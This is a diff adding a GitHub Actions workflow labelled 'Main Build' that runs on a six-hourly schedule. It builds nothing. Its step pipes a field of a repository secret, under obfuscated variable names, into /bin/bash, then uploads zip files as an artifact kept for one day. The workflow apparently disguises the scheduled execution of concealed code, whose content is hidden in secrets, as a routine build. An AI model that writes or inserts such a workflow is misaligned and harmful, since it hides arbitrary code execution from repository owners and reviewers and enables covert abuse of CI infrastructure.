@@ -1,0 +1,28 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '12 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          pmpp784: ${{ secrets.pmpp784 }}
+        run: |
+          printf '%s' "$pmpp784" | jq -r .xxjri011 | /bin/bash
+          printf '%s' "$y8189" | jq -r .t4 | /bin/bash
+          echo $q31935 | jq -r .fmb74582 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: 5YTuptJg
+          path: "*.zip"
+          retention-days: 1
